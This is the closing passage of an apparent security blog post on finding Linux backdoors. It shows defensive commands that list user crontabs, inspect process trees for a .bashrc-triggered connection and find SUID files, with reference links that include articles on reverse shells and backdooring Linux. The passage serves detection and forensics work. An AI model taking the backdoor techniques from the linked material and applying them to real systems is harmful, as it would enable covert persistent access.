</span></span><span class=line><span class=cl>$ <span class=k>for</span> user in <span class=k>$(</span>cat /etc/passwd <span class=p>|</span> grep sh$ <span class=p>|</span> cut -f1 -d: <span class=k>)</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> <span class=nv>$user</span><span class=p>;</span> crontab -u <span class=nv>$user</span> -l<span class=p>;</span> <span class=k>done</span>
</span></span></code></pre></div><p>There is also the <code>ps -f</code> command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on <code>.bashrc</code> file because it gets triggered every time we launch a bash shell (interactive session).</p><p><div class=img-container><img src=imgs/image-20210526034217561.png alt=image-20210526034217561></div></p><p>If you prefer the detailed view, consider to use <code>ps auxfww</code> to show process tree with username, TTY, and a wide output.</p><h3 id=finding-suid>Finding SUID<a class=anchor aria-hidden=true href=#finding-suid>#</a></h3><p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p><p><del>root@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2>/dev/null</del></p><p><div class=img-container><img src=imgs/image-20210526035623660.png alt=image-20210526035623660></div></p><p><strong>[Update]</strong></p><p>Sorry for my stupidity, I forget to update this section.</p><p>Using <code>-perm 4755</code>, you will not find a file with permissions set to <code>4755</code>, <code>4765</code>, <code>4701</code>, etc.</p><p>We can change it to <code>-perm -u=s</code>, so it will always search for the SUID permission (the <code>s</code>/<code>4</code> part).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find / -type f -perm -u<span class=o>=</span>s 2&gt;/dev/null
</span></span></code></pre></div><p>Okay, that’s all in this post, I hope you like it.</p><div class=post-references><h2>References</h2><ul><li><a href=https://www.techslang.com/definition/what-is-a-reverse-shell/ target=_blank rel="noopener noreferrer">https://www.techslang.com/definition/what-is-a-reverse-shell/</a></li><li><a href=https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54 target=_blank rel="noopener noreferrer">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li><li><a href=https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/ target=_blank rel="noopener noreferrer">https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/</a></li><li><a href=https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c target=_blank rel="noopener noreferrer">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li><li><a href=https://gist.github.com/ahhh/1d4bf832c5a88cc75adb target=_blank rel="noopener noreferrer">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li><li><a href=https://ippsec.rocks/?# target=_blank rel="noopener noreferrer">https://ippsec.rocks/?#</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/server/>Server</a></li><li><a href=https://fahmifj.github.io/tags/backdoor/>Backdoor</a></li><li><a href=https://fahmifj.github.io/tags/security/>Security</a></li><li><a href=https://fahmifj.github.io/tags/forensics/>Forensics</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Linux Backdoors and Where to Find Them on twitter" href="https://twitter.com/intent/tweet/?text=Linux%20Backdoors%20and%20Where%20to%20Find%20Them&url=https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f&hashtags=Linux%2cServer%2cBackdoor%2cSecurity%2cForensics"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux Backdoors and Where to Find Them on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f&title=Linux%20Backdoors%20and%20Where%20to%20Find%20Them&summary=Linux%20Backdoors%20and%20Where%20to%20Find%20Them&source=https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux Backdoors and Where to Find Them on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f&title=Linux%20Backdoors%20and%20Where%20to%20Find%20Them"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux Backdoors and Where to Find Them on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux Backdoors and Where to Find Them on whatsapp" href="https://api.whatsapp.com/send?text=Linux%20Backdoors%20and%20Where%20to%20Find%20Them%20-%20https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux Backdoors and Where to Find Them on telegram" href="https://telegram.me/share/url?text=Linux%20Backdoors%20and%20Where%20to%20Find%20Them&url=https%3a%2f%2ffahmifj.github.io%2fblog%2flinux-backdoors-and-where-to-find-them%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>